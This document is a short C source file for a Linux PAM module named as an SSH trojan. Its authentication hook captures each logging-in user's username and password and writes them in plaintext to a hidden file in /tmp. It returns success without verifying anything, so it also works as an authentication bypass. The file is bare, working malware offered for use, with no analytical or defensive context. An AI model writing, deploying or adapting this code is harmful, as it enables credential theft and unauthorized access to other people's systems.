#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define LOG_FILE "/tmp/.log_sshtrojan1.txt"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pam, int flags, int argc, const char **args) {
    const char *username;
    const char *password;
    int ret;
    FILE *log;


    ret = pam_get_item(pam, PAM_USER,(const void **) &username);
    if (ret != PAM_SUCCESS || username == NULL) {
        return PAM_AUTH_ERR;
    }

  
    ret = pam_get_item(pam, PAM_AUTHTOK,(const void **) &password);
    if (ret != PAM_SUCCESS || password == NULL) {
        return PAM_AUTH_ERR;
    }
    
    log = fopen(LOG_FILE, "a");
    if (log != NULL) {
        fprintf(log, "[LOGIN] User: %s | Password: %s\n", username, password);
        fclose(log);
    }
    
    return PAM_SUCCESS;
}
